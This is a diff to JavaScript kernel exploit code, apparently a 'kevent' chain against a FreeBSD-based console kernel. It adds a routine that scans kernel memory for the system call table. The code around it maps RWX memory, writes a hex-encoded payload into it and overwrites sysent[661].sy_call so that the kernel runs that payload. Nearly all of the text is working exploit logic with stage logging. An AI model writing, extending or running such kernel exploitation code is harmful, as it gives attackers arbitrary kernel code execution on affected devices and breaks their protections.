@@ -211,6 +211,29 @@ function phase2Leak(rootKq, fds) {
   return { kva, page: pageVal, targetFd };
 }
 
+// Find a sysent table by validating sysent[0].sy_narg=0, sy_call=ptr, and sysent[661].
+function findSysent(kbase, p) {
+  const starts = [0x1102B70n, 0x110A760n, 0x1100000n];
+  for (const base of starts) {
+    for (let delta = -0x100000n; delta <= 0x100000n; delta += 0x10n) {
+      const addr = kbase + base + delta;
+      try {
+        const narg0 = p.read4(toI64(addr));
+        if (narg0 !== 0) continue;
+        const call0 = p.read8(toI64(addr + 8n));
+        if (call0.hi >>> 0 !== 0xffffffff || call0.low === 0) continue;
+        const sysent661 = addr + 661n * 0x30n;
+        const narg661 = p.read4(toI64(sysent661));
+        if (narg661 < 0 || narg661 > 8) continue;
+        const call661 = p.read8(toI64(sysent661 + 8n));
+        if (call661.hi >>> 0 !== 0xffffffff || call661.low === 0) continue;
+        return { base: addr, delta, call0, call661, narg661 };
+      } catch (e) {}
+    }
+  }
+  return null;
+}
+
 export async function runKevent(c) {
   STATE.ctx = c;
   const kob = c.params && c.params.get ? c.params.get("kbase") : null;
@@ -253,11 +276,9 @@ export async function runKevent(c) {
   STATE.payloadAddr = payloadAddr;
   log("STAGE4-PAYLOAD-ADDR", h16(payloadAddr));
 
-  // MAP NEW PAYLOAD (or reuse if already mapped)
   const payloadSize = 0x40000;
   let mappedAddr = 0n;
 
-  // Try mmap at fixed address with RWX
   try {
     const mrf = scn64("mmap", payloadAddr, payloadSize, 7, 0x12, -1, 0);
     const got = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
@@ -265,7 +286,6 @@ export async function runKevent(c) {
       mappedAddr = got;
       log("STAGE4-MAP-FIXED", "mapped RWX at " + h16(got));
     } else {
-      // Fixed failed, try floating
       const m = scn64("mmap", 0, payloadSize, 7, 0x1002, -1, 0);
       mappedAddr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
       log("STAGE4-MAP-FLOAT", "mapped RWX at " + h16(mappedAddr) + " (fixed refused)");
@@ -277,7 +297,6 @@ export async function runKevent(c) {
 
   if (mappedAddr < 0x10000n) fin("mmap returned invalid address");
 
-  // Write payload bytes (T.PKB is hex-encoded)
   log("STAGE4-WRITE", "writing PKB to " + h16(mappedAddr));
   const pkbLen = T.PKB.length;
   let written = 0;
@@ -290,7 +309,6 @@ export async function runKevent(c) {
   }
   log("STAGE4-WRITE-DONE", "wrote " + written + " bytes");
 
-  // Verify payload
   try {
     const firstFour = p.read4(toI64(mappedAddr));
     log("STAGE4-PAYLOAD-CHECK", "first 4 bytes = 0x" + (firstFour >>> 0).toString(16));
@@ -303,35 +321,31 @@ export async function runKevent(c) {
     fin("cannot read payload");
   }
 
-  // ** 2. Verify sysent table **
-  const SYSENT_BASE_1400 = 0x1102B70n;
-  const sysent661Addr = STATE.kbase + SYSENT_BASE_1400 + 661n * 0x30n + 8n;
-  const sysent11Addr = STATE.kbase + SYSENT_BASE_1400 + 11n * 0x30n + 8n;
+  // ** 2. Find sysent table dynamically **
+  log("STAGE4-SYSENT-SCAN", "scanning for sysent table around known offsets");
+  const sysent = findSysent(STATE.kbase, p);
+  if (!sysent) {
+    log("STAGE4-SYSENT-NOTFOUND", "could not find sysent table in any candidate range");
+    log("STAGE4-ABORT", "kernel base or kernel layout is wrong — need kernel dump");
+    fin("sysent not found");
+  }
 
-  log("STAGE4-SYSENT", "SYSENT base at " + h16(STATE.kbase + SYSENT_BASE_1400));
-  log("STAGE4-661", "sysent[661].sy_call at " + h16(sysent661Addr));
-  log("STAGE4-11", "sysent[11].sy_call at " + h16(sysent11Addr));
+  log("STAGE4-SYSENT-FOUND", "sysent base at " + h16(sysent.base) + " (delta=" + sysent.delta + ", sysent[661].sy_call=" + h16(sysent.call661) + ", narg=" + sysent.narg661 + ")");
 
+  const sysent661Addr = sysent.base + 661n * 0x30n + 8n;
+  const sysent11Addr = sysent.base + 11n * 0x30n + 8n;
+
+  // ** 3. Try sysent[661] first **
   let orig661, orig11;
   try {
     orig661 = p.read8(toI64(sysent661Addr));
     orig11 = p.read8(toI64(sysent11Addr));
     log("STAGE4-ORIG", "sysent[661]=" + h16(orig661) + " sysent[11]=" + h16(orig11));
-
-    if (orig661.hi >>> 0 !== 0xffffffff && orig661.lo !== 0n) {
-      log("STAGE4-SYSENT-INVALID", "sysent[661] is NOT a valid kernel pointer — offset wrong");
-      log("STAGE4-ABORT", "cannot proceed without correct SYSENT_BASE_1400");
-      fin("sysent table invalid");
-    }
-    if (orig661.hi >>> 0 === 0xffffffff) {
-      log("STAGE4-SYSENT-OK", "sysent[661].sy_call looks valid");
-    }
   } catch (e) {
     log("STAGE4-READ-FAIL", e.message);
     fin("failed to read sysent table");
   }
 
-  // ** 3. Try sysent[661] first **
   log("STAGE4-661-HIJACK", "writing " + h16(mappedAddr) + " to sysent[661].sy_call");
   p.write8(toI64(sysent661Addr), toI64(mappedAddr));
 
